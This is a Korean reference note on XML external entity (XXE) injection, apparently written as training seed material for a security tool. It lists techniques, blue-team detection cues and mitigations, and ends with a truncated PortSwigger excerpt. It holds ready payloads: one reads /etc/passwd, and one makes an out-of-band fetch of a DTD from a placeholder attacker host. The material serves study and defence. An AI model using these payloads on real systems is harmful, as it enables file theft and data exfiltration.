# 학습 시드(심화): xxe

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn xxe`. P1: 머신별 라이트업 미참조.

## 개요
XML 외부개체 주입: XML 파서의 외부개체 처리로 파일읽기·SSRF·OOB 반출·DoS. CWE-611.

## 핵심 기법 · 열거
- 파일읽기: <!ENTITY x SYSTEM 'file:///etc/passwd'>
- SSRF: SYSTEM 'http://169.254.169.254/...'
- Blind OOB: 외부 DTD 로 데이터를 공격자 서버로 반출
- DoS: Billion Laughs(엔티티 확장)
- 파라미터 엔티티(%)로 필터 우회

## 표준 도구 · 명령
```
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
OOB: <!ENTITY % d SYSTEM "http://<lhost>/e.dtd"> %d;
```

## 블루팀 탐지
XML 입력의 DOCTYPE/ENTITY/SYSTEM·file:// 참조. 파서의 외부 DTD fetch(OOB 콜백).

## 완화
외부개체·DTD 비활성(FEATURE_SECURE_PROCESSING)·JSON 대체·파서 강화.

- 출처(검증): https://portswigger.net/web-security/xxe

## 최신 보강(승격)

> `assassin --promote` 품질 관문을 통과한 권위 출처 발췌. 수정·삭제는 PR 리뷰로. 사람이 다듬은 위 섹션이 우선한다.

### PortSwigger XXE
- 출처: https://portswigger.net/web-security/xxe
- 승격일: 2026-10-07
- 요약: XML external entity (XXE) injection In this section, we'll explain what XML external entity injection is, describe some common examples, explain how to find and exploit various kinds of XXE injection, and summarize how to prevent XXE injection attacks. What is XML external entity injection? XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files o
